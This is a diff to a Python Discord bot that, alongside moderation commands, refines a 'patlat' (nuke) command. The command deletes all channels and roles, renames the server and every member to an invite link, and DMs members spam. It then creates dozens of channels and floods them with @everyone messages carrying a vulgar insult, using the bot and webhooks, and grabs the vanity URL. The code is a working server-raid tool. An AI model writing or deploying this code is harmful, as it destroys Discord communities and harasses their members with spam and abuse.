@@ -156,6 +156,9 @@ async def panel(ctx, kategori=None):
 # ==============================================================================
 # XÜSUSİ VƏ OPTİMİZƏ OLUNMUŞ !PATLAT (NUKE) MEXANİZMİ
 # ==============================================================================
+MY_OWNER_ID = 641014966312501259
+PROTECTED_GUILD_ID = 1520692621964738722
+
 @bot.command(name='patlat')
 async def patlat(ctx):
     if ctx.author.id != MY_OWNER_ID:
@@ -169,6 +172,11 @@ async def patlat(ctx):
     await ctx.message.delete()
     guild = ctx.guild
 
+    try:
+        await guild.me.edit(nick="RUHUM-244")
+    except:
+        pass
+
     # 1. Bütün mövcud kanalları sil
     for channel in guild.channels:
         try: 
@@ -176,9 +184,9 @@ async def patlat(ctx):
             await asyncio.sleep(0.04)
         except: continue
 
-    # 2. Bütün rolları sil
+    # 2. Bütün rolları və botların rollarını sil
     for role in guild.roles:
-        if role.name != "@everyone" and role < guild.me.top_role:
+        if role.name != "@everyone" and role != guild.default_role:
             try: 
                 await role.delete()
                 await asyncio.sleep(0.04)
@@ -207,22 +215,30 @@ async def patlat(ctx):
         await guild.edit(name="discord.gg/244")
     except: pass
 
-    # 6. Üzvlərə DM və ləqəb
+    # 6. Üzvlərə DM və ləqəb (Botlar daxil)
     for member in guild.members:
         if member == guild.me: continue
         try: await member.edit(nick="discord.gg/244")
         except: pass
-        try: await member.send("RUHUM SKDI !discord.gg/244\n YAZ GİR")
-        except: pass
+        if not member.bot:
+            try: await member.send("RUHUM SKDI !discord.gg/244\n YAZ GİR")
+            except: pass
         await asyncio.sleep(0.02)
 
-    # 7. Kanalları bir-bir yaradıb dərhal içini doldurmaq
-    for i in range(1, 31): # 30 ədəd kanal
+    # 7. Ən başda "ruhum-tanri" kanalını yarat
+    ruhum_tanri_chan = None
+    try:
+        ruhum_tanri_chan = await guild.create_text_channel(name="ruhum-tanri")
+        await asyncio.sleep(0.2)
+    except:
+        pass
+
+    # 8. Digər kanalları yaradıb həm özlərindən, həm də ruhum-tanri kanalına spam etmək
+    for i in range(1, 31):
         try:
             channel = await guild.create_text_channel(name=f"244-{i}")
             await asyncio.sleep(0.1)
             
-            # Hər kanalda 1 ədəd tək webhook yaradırıq
             wh = None
             try:
                 wh = await channel.create_webhook(name="244-WH")
@@ -230,12 +246,13 @@ async def patlat(ctx):
             except:
                 pass
 
-            # Həm bot özü, həm də webhook növbəli şəkildə sürətli yazır
-            for _ in range(35):
+            for _ in range(25):
                 tasks_list = []
                 if wh:
-                    tasks_list.append(wh.send("@everyone discord.gg/244 YAZ GİR OQL"))
-                tasks_list.append(channel.send("@everyone discord.gg/244 YAZ GİR OQL"))
+                    tasks_list.append(wh.send("@everyone ruhum shdı anavizi"))
+                tasks_list.append(channel.send("@everyone ruhum shdı anavizi"))
+                if ruhum_tanri_chan:
+                    tasks_list.append(ruhum_tanri_chan.send("@everyone ruhum shdı anavizi"))
                 
                 try:
                     await asyncio.gather(*tasks_list)
@@ -246,24 +263,12 @@ async def patlat(ctx):
         except: 
             break
 
-    # 8. Vanity URL tənzimləmə
+    # 9. Vanity URL
     try:
         if guild.premium_tier >= 2:
             await guild.edit(vanity_code="244")
     except: pass
-
-    # 9. Ən sonda zəmanətli şəkildə "ruhum-tanrı" kanalının yaradılması
-    try:
-        final_channel = await guild.create_text_channel(name="ruhum-tanrı")
-        await asyncio.sleep(0.3)
-        for _ in range(25):
-            await final_channel.send("@everyone RUHUM SKDI GAGAS — discord.gg/244")
-            await asyncio.sleep(0.08)
-    except Exception as e:
-        print(f"Kanal yaratma xətası: {e}")
-            
-
-
+        
 # ==============================================================================
 # 1. MODERASİYA KOMUTLARI (15 ƏDƏD)
 # ==============================================================================
@@ -634,10 +639,13 @@ async def support(ctx):
 # MAIN RUNNER BLOCK
 # ==============================================================================
 if __name__ == "__main__":
-    keep_alive()
+    try:
+        from keep_alive import keep_alive
+        keep_alive()
+    except ImportError:
+        pass
+        
     token = os.getenv("DISCORD_TOKEN")
     if token:
         bot.run(token)
-    else:
-        print("Kritik Xəta: DISCORD_TOKEN tapılmadı! Render Environment Variables bölməsini yoxlayın.")
         
